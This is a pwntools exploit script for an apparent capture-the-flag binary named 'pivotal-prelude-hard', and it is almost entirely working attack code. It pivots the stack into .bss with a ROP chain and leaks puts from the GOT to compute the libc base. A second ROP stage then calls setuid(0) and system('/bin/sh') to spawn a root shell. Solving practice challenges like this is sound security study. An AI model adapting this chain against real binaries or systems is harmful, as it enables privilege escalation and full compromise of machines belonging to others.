#!/usr/bin/env python3

from pwn import *

exe = ELF("/challenge/pivotal-prelude-hard")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

pop_rbp = 0x4011bd
pop_rdi = 0x402283
leave_ret = 0x40215f
puts_plt = 0x4010a0
puts_got = 0x405020
ret = 0x40101a
challenge = 0x4020ff

def main():
    r = conn()
    log.info(f"pid => {r.pid}")
    pause()
    # good luck pwning :)
    payload = flat(
        pop_rbp,
        exe.bss() + 65584,
        leave_ret,
        pop_rdi,
        puts_got,
        puts_plt,
        challenge
    )
    r.sendline(payload)
    r.recvuntil(b'Leaving!\n')
    leak = u64(r.recvn(6).ljust(8, b'\x00'))
    log.success(f"leak => {hex(leak)}")
    libc_base = leak - 0x84420
    log.success(f"libc_base => {hex(libc_base)}")
    system = libc_base + 0x52290
    setuid = libc_base + 0xe4150
    binsh = libc_base + 0x1b45bd
    payload2 = flat(
        pop_rbp,
        exe.bss() + 65648,
        leave_ret,
	    b"\x90" * 64,
        pop_rdi,
        0,
        setuid,
        pop_rdi,
        binsh,
        system
    )
    r.sendline(payload2)
    r.interactive()


if __name__ == "__main__":
    main()

